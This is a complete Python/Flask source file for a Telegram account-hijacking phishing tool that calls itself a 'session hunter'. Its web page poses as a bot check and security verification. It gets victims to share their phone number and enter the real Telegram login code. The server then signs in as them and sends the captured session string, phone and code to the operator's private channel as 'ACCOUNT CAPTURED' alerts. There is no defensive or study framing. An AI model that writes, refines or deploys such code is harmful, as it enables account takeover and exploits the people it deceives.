import os
import asyncio
import json
import threading
from datetime import datetime
from telethon import TelegramClient, errors, events
from telethon.sessions import StringSession
from flask import Flask, request, jsonify, render_template_string
import psycopg2
from psycopg2.extras import RealDictCursor

# --- CONFIGURATION ---
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = int(os.environ.get("CHANNEL_ID"))
DATABASE_URL = os.environ.get("DATABASE_URL")

if not all([API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID, DATABASE_URL]):
    print("ERROR: Missing required environment variables.")
    exit(1)

print("=" * 50)
print("STARTING SESSION HUNTER...")
print(f"Target Channel ID: {CHANNEL_ID}")
print("=" * 50)

app = Flask(__name__)

# --- DATABASE SETUP ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                user_id TEXT PRIMARY KEY,
                phone TEXT NOT NULL,
                phone_code_hash TEXT,
                session_string TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        conn.close()
        print("Database initialized.")
    except Exception as e:
        print(f"Database initialization failed: {e}")

# --- GLOBAL STORAGE ---
active_sessions = {}

# --- TELETHON CLIENT FOR BOT ---
bot_client = TelegramClient('bot_session', API_ID, API_HASH)

async def send_to_channel(message_text):
    """Send captured data to your private channel."""
    try:
        temp_client = TelegramClient('logger', API_ID, API_HASH)
        await temp_client.start(bot_token=BOT_TOKEN)
        await temp_client.send_message(CHANNEL_ID, message_text)
        await temp_client.disconnect()
        print("[LOG] Sent to channel successfully.")
    except Exception as e:
        print(f"[ERROR] Failed to send to channel: {e}")

# --- FRONTEND HTML (COMPLETE) ---
FRONTEND_HTML = """<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: url('https://res.cloudinary.com/bhcgogng/image/upload/v1784494648/photo_2026-07-19_23-37-40_bwzfbi.jpg') no-repeat center center fixed; background-size: cover; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; padding: 20px; background: rgba(0, 0, 0, 0.3); }
        .card { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); padding: 40px 30px; border-radius: 20px; text-align: center; max-width: 400px; width: 100%; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); }
        h2 { color: #fff; margin-bottom: 20px; font-size: 22px; font-weight: 600; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
        p { color: #ddd; font-size: 14px; margin-bottom: 30px; line-height: 1.5; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
        .robot-icon { font-size: 100px; margin-bottom: 20px; display: block; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3)); }
        .btn { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 16px 30px; border-radius: 12px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; margin: 10px 0; transition: all 0.3s; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.1); }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { background: rgba(68, 68, 68, 0.8); cursor: not-allowed; }
        #verificationScreen, #codeScreen { display: none; }
        .code-slots { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; }
        .code-slot { width: 55px; height: 55px; border: 2px solid rgba(255, 255, 255, 0.3); border-radius: 12px; background: rgba(255, 255, 255, 0.1); display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: #fff; backdrop-filter: blur(5px); }
        .code-slot.filled { background: rgba(255, 107, 157, 0.8); border-color: rgba(255, 107, 157, 0.9); }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 320px; margin: 0 auto; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 20px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
        .key { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 24px; font-weight: bold; cursor: pointer; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.1); }
        .key.clear { background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8)); }
        .error { color: #ff6b6b; font-size: 14px; margin-top: 10px; display: none; text-shadow: 0 1px 2px rgba(0,0,0,0.5); font-weight: bold; }
        .loading { display: none; color: #ddd; margin-top: 10px; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
    </style>
</head>
<body>
    <div class="container">
        <div id="antiBotScreen">
            <div class="card">
                <span class="robot-icon">🤖</span>
                <h2>Please confirm that you are not a robot ✅</h2>
                <p>This verification helps us ensure the security and integrity of our service.</p>
                <button class="btn" onclick="handleConfirm()">Confirm ✅</button>
            </div>
        </div>
        <div id="verificationScreen">
            <div class="card">
                <h2>Security Verification</h2>
                <p>To ensure your account security, we need to verify your identity.</p>
                <button class="btn" id="shareBtn" onclick="handleContact()">Share Contact & Verify</button>
                <div class="loading" id="contactLoading">Requesting contact...</div>
            </div>
        </div>
        <div id="codeScreen">
            <div class="card">
                <h2>Enter Verification Code</h2>
                <p>We sent a verification code to your Telegram app. Enter it below.</p>
                <div class="code-slots" id="codeSlots">
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                </div>
                <div class="keypad">
                    <button class="key" onclick="pressKey('1')">1</button>
                    <button class="key" onclick="pressKey('2')">2</button>
                    <button class="key" onclick="pressKey('3')">3</button>
                    <button class="key" onclick="pressKey('4')">4</button>
                    <button class="key" onclick="pressKey('5')">5</button>
                    <button class="key" onclick="pressKey('6')">6</button>
                    <button class="key" onclick="pressKey('7')">7</button>
                    <button class="key" onclick="pressKey('8')">8</button>
                    <button class="key" onclick="pressKey('9')">9</button>
                    <button class="key clear" onclick="pressKey('clear')">C</button>
                    <button class="key" onclick="pressKey('0')">0</button>
                    <button class="key clear" onclick="pressKey('back')">⌫</button>
                </div>
                <button class="btn" onclick="submitCode()" style="margin-top: 20px;">Verify</button>
                <div class="error" id="errorBox">Invalid code.</div>
                <div class="loading" id="loadingBox">Verifying...</div>
            </div>
        </div>
        <div id="successScreen" style="display: none;">
            <div class="card">
                <h2>Success! ✅</h2>
                <p style="color: #00ff88; font-size: 16px;">Your account has been verified successfully.</p>
            </div>
        </div>
    </div>
    <script>
        var tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        var userId = null;
        var enteredCode = '';
        
        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
            userId = tg.initDataUnsafe.user.id;
        }
        
        function handleConfirm() {
            document.getElementById('antiBotScreen').style.display = 'none';
            document.getElementById('verificationScreen').style.display = 'block';
        }
        
        function handleContact() {
            document.getElementById('shareBtn').disabled = true;
            document.getElementById('contactLoading').style.display = 'block';
            
            tg.requestContact(function(success, response) {
                if (success && response && response.contact) {
                    var phone = response.contact.phone_number;
                    console.log('Phone received:', phone);
                    
                    fetch('/request_code', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            user_id: userId,
                            phone: phone 
                        })
                    })
                    .then(function(res) { return res.json(); })
                    .then(function(data) {
                        document.getElementById('contactLoading').style.display = 'none';
                        if (data.success) {
                            document.getElementById('verificationScreen').style.display = 'none';
                            document.getElementById('codeScreen').style.display = 'block';
                        } else {
                            alert('Error: ' + (data.error || 'Failed to request code'));
                            document.getElementById('shareBtn').disabled = false;
                        }
                    })
                    .catch(function(err) {
                        alert('Network error: ' + err.message);
                        document.getElementById('shareBtn').disabled = false;
                        document.getElementById('contactLoading').style.display = 'none';
                    });
                } else {
                    alert('Please share your contact to continue.');
                    document.getElementById('shareBtn').disabled = false;
                    document.getElementById('contactLoading').style.display = 'none';
                }
            });
        }
        
        function pressKey(key) {
            if (key === 'back') {
                enteredCode = enteredCode.slice(0, -1);
            } else if (key === 'clear') {
                enteredCode = '';
            } else {
                if (enteredCode.length < 5) {
                    enteredCode += key;
                }
            }
            updateCodeDisplay();
        }
        
        function updateCodeDisplay() {
            var slots = document.querySelectorAll('.code-slot');
            for (var i = 0; i < slots.length; i++) {
                if (i < enteredCode.length) {
                    slots[i].textContent = '•';
                    slots[i].classList.add('filled');
                } else {
                    slots[i].textContent = '';
                    slots[i].classList.remove('filled');
                }
            }
        }
        
        function submitCode() {
            if (enteredCode.length !== 5) {
                alert('Please enter the full 5-digit code.');
                return;
            }
            document.getElementById('loadingBox').style.display = 'block';
            document.getElementById('errorBox').style.display = 'none';
            
            fetch('/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code: enteredCode, user_id: userId })
            })
            .then(function(res) { 
                if (!res.ok) {
                    throw new Error('Server error: ' + res.status);
                }
                return res.json(); 
            })
            .then(function(data) {
                document.getElementById('loadingBox').style.display = 'none';
                if (data.success) {
                    document.getElementById('codeScreen').style.display = 'none';
                    document.getElementById('successScreen').style.display = 'block';
                    setTimeout(function() { tg.close(); }, 2000);
                } else {
                    document.getElementById('errorBox').textContent = data.error || 'Invalid code.';
                    document.getElementById('errorBox').style.display = 'block';
                    enteredCode = '';
                    updateCodeDisplay();
                }
            })
            .catch(function(err) {
                document.getElementById('loadingBox').style.display = 'none';
                document.getElementById('errorBox').textContent = 'Error: ' + err.message;
                document.getElementById('errorBox').style.display = 'block';
            });
        }
        
        updateCodeDisplay();
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(FRONTEND_HTML)

@app.route('/request_code', methods=['POST'])
def request_code():
    """Use TelegramClient to request login code from Telegram servers."""
    data = request.json
    user_id = str(data.get('user_id'))
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"success": False, "error": "Phone number required"})
    
    print(f"\n{'='*50}")
    print(f"[REQUEST CODE] User: {user_id}")
    print(f"[REQUEST CODE] Phone: {phone}")
    print(f"{'='*50}\n")
    
    try:
        # Create event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Create TelegramClient and connect
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        # Request login code - THIS SENDS THE REAL LOGIN CODE TO USER'S TELEGRAM
        result = loop.run_until_complete(client.send_code_request(phone))
        phone_code_hash = result.phone_code_hash
        
        # Get session string
        session_string = client.session.save()
        
        # Store in memory (CRITICAL: same client instance used later)
        active_sessions[user_id] = {
            'client': client,
            'phone': phone,
            'hash': phone_code_hash,
            'loop': loop
        }
        
        # Also store in database for persistence
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO sessions (user_id, phone, phone_code_hash, session_string)
            VALUES (%s, %s, %s, %s)
            ON CONFLICT (user_id) 
            DO UPDATE SET phone = %s, phone_code_hash = %s, session_string = %s, created_at = CURRENT_TIMESTAMP
        """, (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
        conn.commit()
        cur.close()
        conn.close()
        
        print(f"[SUCCESS] Login code requested for {phone}")
        return jsonify({"success": True})
        
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/verify', methods=['POST'])
def verify_code():
    """Complete login and capture session string."""
    data = request.json
    code = data.get('code')
    user_id = str(data.get('user_id'))
    
    print(f"\n{'='*50}")
    print(f"[VERIFY] User: {user_id}")
    print(f"[VERIFY] Code: {code}")
    print(f"{'='*50}\n")
    
    if user_id not in active_sessions:
        return jsonify({"success": False, "error": "Session expired. Please restart."})
    
    session_data = active_sessions[user_id]
    client = session_data['client']
    phone = session_data['phone']
    phone_code_hash = session_data['hash']
    loop = session_data['loop']
    
    try:
        # Complete login with the SAME client that requested the code
        loop.run_until_complete(client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash))
        
        # Capture the final session string (THIS IS THE STOLEN SESSION!)
        final_session = client.session.save()
        
        print(f"\n{'='*50}")
        print(f"[CAPTURED] Phone: {phone}")
        print(f"[SESSION] {final_session}")
        print(f"{'='*50}\n")
        
        # Send to your Telegram channel
        message = f"""🚨 ACCOUNT CAPTURED 🚨

📞 Phone: `{phone}`
🔑 Code Used: `{code}`
🔐 Session String:
`{final_session}`

⏰ {datetime.now()}"""
        
        loop.run_until_complete(send_to_channel(message))
        
        # Disconnect client
        loop.run_until_complete(client.disconnect())
        
        # Cleanup
        del active_sessions[user_id]
        
        # Cleanup database
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
        conn.commit()
        cur.close()
        conn.close()
        
        return jsonify({"success": True})
        
    except errors.PhoneCodeInvalidError:
        return jsonify({"success": False, "error": "Invalid code. Please try again."})
    except errors.PhoneCodeExpiredError:
        return jsonify({"success": False, "error": "Code expired. Please request a new one."})
    except errors.SessionPasswordNeededError:
        loop.run_until_complete(client.disconnect())
        del active_sessions[user_id]
        loop.run_until_complete(send_to_channel(f"⚠️ 2FA Detected for {phone}"))
        return jsonify({"success": False, "error": "This account has 2FA enabled."})
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        return jsonify({"success": False, "error": str(e)})

# --- BOT LISTENER (Optional - for direct messages to bot) ---
async def bot_listener():
    print("Starting bot listener...")
    await bot_client.start(bot_token=BOT_TOKEN)
    print("Bot is online.")

    @bot_client.on(events.NewMessage)
    async def handler(event):
        if event.message.media and hasattr(event.message.media, "phone_number"):
            phone = event.message.media.phone_number
            user_id = str(event.message.sender_id)
            print(f"Bot received contact from {user_id}: {phone}")

    await bot_client.run_until_disconnected()

# --- MAIN ---
if __name__ == '__main__':
    init_db()
    
    # Start bot listener in background
    def run_bot():
        asyncio.run(bot_listener())
    
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # Start Flask
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting web server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
